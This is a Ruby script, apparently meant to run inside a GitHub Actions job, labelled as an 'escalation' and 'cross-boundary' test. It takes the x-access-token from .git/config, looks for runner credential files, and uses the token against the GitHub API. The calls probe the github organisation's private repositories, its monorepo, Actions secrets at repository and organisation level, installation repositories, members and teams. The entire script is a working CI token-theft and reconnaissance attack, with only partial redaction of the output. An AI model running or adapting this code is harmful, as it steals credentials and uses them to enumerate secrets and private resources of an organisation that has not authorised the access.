require 'net/http'
require 'json'
require 'uri'

$stdout.puts "=== ESCALATION: Token from .git/config ==="

git_config = nil
[".git/config", "../.git/config", "../../.git/config"].each do |path|
  if File.exist?(path)
    git_config = File.read(path)
    $stdout.puts "Found git config at: #{path}"
    break
  end
end

token = nil
if git_config
  if git_config =~ /x-access-token:([^\s@]+)/
    token = $1
    $stdout.puts "Token found in .git/config"
    $stdout.puts "Token length: #{token.length}"
    $stdout.puts "Token prefix: #{token[0..5]}..."
  else
    $stdout.puts "No x-access-token in .git/config"
    git_config.lines.each do |line|
      if line =~ /url|token|auth|credential/i
        redacted = line.gsub(/ghs_[A-Za-z0-9]+/, 'ghs_[REDACTED]')
        redacted = redacted.gsub(/ghp_[A-Za-z0-9]+/, 'ghp_[REDACTED]')
        $stdout.puts "  config: #{redacted.strip}"
      end
    end
  end
end

runner_creds = Dir.glob("/home/runner/work/_temp/.{runner,credentials}*") rescue []
$stdout.puts "Runner temp files: #{runner_creds.length}"

if token && !token.empty?
  $stdout.puts ""
  $stdout.puts "=== CROSS-BOUNDARY TEST WITH .git TOKEN ==="

  uri = URI("https://api.github.com/")
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = true

  req = Net::HTTP::Get.new("/repos/github/explore")
  req["Authorization"] = "Bearer #{token}"
  req["Accept"] = "application/vnd.github+json"
  res = http.request(req)
  $stdout.puts "1. GET /repos/github/explore: #{res.code}"
  $stdout.puts "   X-OAuth-Scopes: #{res['X-OAuth-Scopes']}"

  req2 = Net::HTTP::Get.new("/orgs/github/repos?type=all&per_page=3&sort=updated")
  req2["Authorization"] = "Bearer #{token}"
  req2["Accept"] = "application/vnd.github+json"
  res2 = http.request(req2)
  $stdout.puts "2. GET /orgs/github/repos?type=all: #{res2.code}"
  if res2.code == "200"
    repos = JSON.parse(res2.body)
    repos.each do |r|
      $stdout.puts "   repo: #{r['full_name']} private=#{r['private']} visibility=#{r['visibility']}"
    end
  end

  req3 = Net::HTTP::Get.new("/repos/github/github")
  req3["Authorization"] = "Bearer #{token}"
  req3["Accept"] = "application/vnd.github+json"
  res3 = http.request(req3)
  $stdout.puts "3. GET /repos/github/github (monorepo): #{res3.code}"

  req4 = Net::HTTP::Get.new("/repos/github/explore/actions/secrets")
  req4["Authorization"] = "Bearer #{token}"
  req4["Accept"] = "application/vnd.github+json"
  res4 = http.request(req4)
  $stdout.puts "4. GET actions/secrets: #{res4.code}"
  if res4.code == "200"
    data = JSON.parse(res4.body)
    $stdout.puts "   total_count: #{data['total_count']}"
    data['secrets']&.each { |s| $stdout.puts "   secret_name: #{s['name']}" }
  end

  req5 = Net::HTTP::Get.new("/orgs/github/actions/secrets?per_page=3")
  req5["Authorization"] = "Bearer #{token}"
  req5["Accept"] = "application/vnd.github+json"
  res5 = http.request(req5)
  $stdout.puts "5. GET /orgs/github/actions/secrets: #{res5.code}"

  req6 = Net::HTTP::Get.new("/installation/repositories?per_page=5")
  req6["Authorization"] = "Bearer #{token}"
  req6["Accept"] = "application/vnd.github+json"
  res6 = http.request(req6)
  $stdout.puts "6. GET /installation/repositories: #{res6.code}"
  if res6.code == "200"
    data6 = JSON.parse(res6.body)
    $stdout.puts "   total_count: #{data6['total_count']}"
    data6['repositories']&.first(5)&.each do |r|
      $stdout.puts "   install_repo: #{r['full_name']} private=#{r['private']}"
    end
  end

  req7 = Net::HTTP::Get.new("/orgs/github/members?per_page=3")
  req7["Authorization"] = "Bearer #{token}"
  req7["Accept"] = "application/vnd.github+json"
  res7 = http.request(req7)
  $stdout.puts "7. GET /orgs/github/members: #{res7.code}"

  req8 = Net::HTTP::Get.new("/orgs/github/teams?per_page=3")
  req8["Authorization"] = "Bearer #{token}"
  req8["Accept"] = "application/vnd.github+json"
  res8 = http.request(req8)
  $stdout.puts "8. GET /orgs/github/teams: #{res8.code}"
end

$stdout.puts ""
$stdout.puts "=== END ESCALATION TEST ==="
$stdout.flush